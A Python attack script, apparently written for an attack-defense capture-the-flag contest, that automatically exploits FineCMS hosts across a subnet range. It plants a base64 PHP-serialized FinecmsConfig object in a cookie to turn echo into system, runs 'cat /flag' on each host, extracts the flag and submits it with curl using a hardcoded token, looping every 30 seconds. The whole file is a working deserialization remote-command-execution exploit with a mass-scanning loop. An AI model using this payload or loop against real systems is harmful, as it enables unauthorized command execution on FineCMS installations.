import requests
import re
import os
from time import sleep

url = 'http://172.16.5.{}:5076/index.php'
# url = 'http://172.16.9.30/index.php'
data = {'param': 'cat /flag'}
post_url = 'https://172.16.4.1/Common/awd_sub_answer'
token = 'e7a8b2d8e7356e5b1e9eacd358201654'

while True:
    cnt = 0
    for i in range(10, 72):
        print('i={}'.format(i))
        try:
            rrl = url.format(i)
            s = requests.session()
            s.get(rrl, timeout=(1, 1))
            s.cookies[
                'FINECMS_CONFIG'] = 'TzoxMzoiRmluZWNtc0NvbmZpZyI6Mzp7czoyMToiAEZpbmVjbXNDb25maWcAY29uZmlnIjtzOjA6IiI7czoxOToiAEZpbmVjbXNDb25maWcAcGF0aCI7TjtzOjY6ImZpbHRlciI7YToxOntzOjQ6ImVjaG8iO3M6Njoic3lzdGVtIjt9fQ'

            r = s.get(rrl, params=data, timeout=(1, 1))
            flag = re.search('........-....-....-....-............', r.text).group()
            os.system('curl -k {} -d "token={}&answer={}"'.format(post_url, token, flag))
            print(flag)
            cnt += 1
        except Exception as e:
            print(e)
    print(cnt)
    sleep(30)
